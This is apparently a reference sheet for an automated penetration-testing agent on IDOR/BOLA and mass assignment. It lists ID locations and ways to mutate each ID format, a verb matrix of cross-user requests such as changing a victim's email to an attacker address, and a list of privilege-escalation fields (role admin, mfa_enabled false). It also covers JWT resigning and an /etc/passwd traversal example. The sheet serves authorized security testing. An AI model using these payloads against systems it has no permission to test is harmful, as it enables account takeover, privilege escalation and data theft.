# IDOR / BOLA Reference — object references, verbs, id formats, mass assignment

## Where object references hide

| Location | Examples |
|---|---|
| Path | `/api/v2/users/1041`, `/orders/884/invoice`, `/files/report_2024_u1041.pdf` |
| Query | `?id=`, `?uid=`, `?user_id=`, `?account=`, `?acct=`, `?customer=`, `?doc=`, `?file=`, `?invoice=`, `?order=`, `?msg=`, `?ticket=`, `?key=`, `?ref=` |
| JSON body | `{"userId":1041}`, `{"order":{"id":884}}`, `{"ids":[1,2,3]}`, GraphQL `node(id:"...")` |
| Form fields | hidden inputs `user_id`, `account_number`, `profile_id` |
| Headers | `X-User-Id`, `X-Account-Id`, `X-Tenant`, `X-Org`, custom `*-Id` headers |
| Cookies | `uid=1041`, serialized session blobs containing ids |
| JWT claims | `sub`, `uid`, `user_id`, `tenant_id`, `org` — resign if alg=none/weak secret, else use as enumeration seed |
| Filenames | `export_1041.csv`, `avatar/1041.jpg`, S3-style keys |
| WebSocket messages | same JSON ids inside frames — replay with the other identity's socket |

## ID formats and how to attack each

- **Sequential integers**: `1041` -> try `1040`, `1042`, `1`, `0`, `-1`, a sample
  across the range. Also `1041.0`, `01041`, `1041e0`, array form `id[]=1041&id[]=1042`.
- **UUIDs**: not guessable, but **leaked everywhere** — harvest from: other API
  responses (user lists, search, autocomplete, comments/authors), HTML source,
  JS state blobs, export files, email links, password-reset flows, websocket
  traffic. UUIDv1 encodes timestamp+MAC: generate neighbors with
  `uuid1()`-style reconstruction if creation time is known.
- **Base64-wrapped**: `dXNlcjoxMDQx` -> decode (`user:1041`) -> swap -> re-encode.
  GraphQL relay ids are almost always `base64("Type:1041")`.
- **Hex / hash**: 32-hex may be `md5(id)` — compute `md5("1042")` etc.; 40-hex
  sha1. Try hashing the username/email too.
- **Composite**: `ACC-2024-001041` — mutate only the numeric tail.
- **Signed/HMAC ids**: look for a second parameter (`sig`, `token`) — try
  removing it, emptying it, or reusing A's signature on B's id.

## Verb matrix — test every method per route

For each object route, try all of these as the non-owner identity:

```
GET /api/users/<B_ID>              read
PUT /api/users/<B_ID>              full overwrite (send A's body with B's id)
PATCH /api/users/<B_ID>            partial overwrite (e.g. {"email":"attacker@example.net"})
DELETE /api/users/<B_ID>           destroy
POST /api/users/<B_ID>/notes       create under B
HEAD /api/users/<B_ID>             existence oracle even when GET is blocked
OPTIONS /api/users/<B_ID>          reveals allowed verbs (Allow: header)
```

Also: the **id in two places** trick — URL says A's id, body says B's id (and
reversed); many frameworks authorize on one and act on the other:

```
PATCH /api/users/<A_ID>
{"id": <B_ID>, "email": "attacker@example.net"}
```

Confirm **writes** out-of-band: log in as B (or GET as B) and verify the change
landed. A 200 on a PUT is not proof by itself.

## Second-order IDOR

The vulnerable parameter may be consumed later: set `?export_user=1042` now,
receive B's data in a generated report/email/download minutes later. Watch
async job endpoints (`/jobs/<id>/result`) — the job id itself is often IDOR-able.

## Static/file IDOR

Direct object = file: `/download?file=../../etc/passwd` is traversal, but
`/download?file=invoice_1042.pdf` is IDOR. Also predictable storage URLs
(`https://cdn.example.com/u/1041/tax.pdf`) that skip app auth entirely — fetch
them unauthenticated.

## Mass assignment payload list

Add to profile-update / registration / settings bodies (JSON):

```json
"role": "admin"            "roles": ["admin"]         "role_id": 1
"isAdmin": true            "is_admin": true           "admin": true
"is_staff": true           "is_superuser": true       "superuser": true
"group": "admin"           "groups": ["administrators"]
"access_level": 100        "privilege": "admin"       "permissions": ["*"]
"user_type": "admin"       "account_type": "premium"  "plan": "enterprise"
"verified": true           "email_verified": true     "approved": true
"active": true             "enabled": true            "mfa_enabled": false
"balance": 99999           "credit": 99999            "discount": 100
"owner_id": <A_ID>         "tenant_id": <OTHER>       "org_id": <OTHER>
```

Form-encoded / framework-flavored:

```
user[admin]=1                 (Rails)
user[role_ids][]=1            (Rails)
admin=1&role=admin            (generic)
_method=PUT                   (method override via body)
```

Discovery of candidate field names:
- GET the same object first — fields present in the response but absent from the
  edit form are prime targets.
- Swagger/OpenAPI (`/swagger.json`, `/openapi.json`, `/v2/api-docs`), GraphQL
  introspection (`__schema { types { name fields { name } } }`).
- JS bundles: grep for model definitions, `role`, `admin`, `permission`.
- Verbose validation errors: send `{"zzz":1}` — some frameworks list valid fields.

After each injection, GET the object back (and attempt an admin-only action) to
confirm the field stuck.

## Classification quick map

| Behavior | WSTG | CWE |
|---|---|---|
| Read another user's object | WSTG-ATHZ-04 | CWE-639 |
| Write/delete another user's object | WSTG-ATHZ-04 | CWE-639 (impact ↑, usually high/critical) |
| Low-priv reaches admin function | WSTG-ATHZ-02 / WSTG-ATHZ-03 | CWE-285 / CWE-269 |
| Mass assignment to privileged field | WSTG-ATHZ-03 | CWE-915 |
| Missing auth entirely (anon success) | WSTG-ATHZ-02 | CWE-284 |

Every confirmed case: `findings.report` with both exchanges (owner baseline +
cross-identity replay) in evidence — shapes in `rupu.md`; file via the
`finding-report` skill.
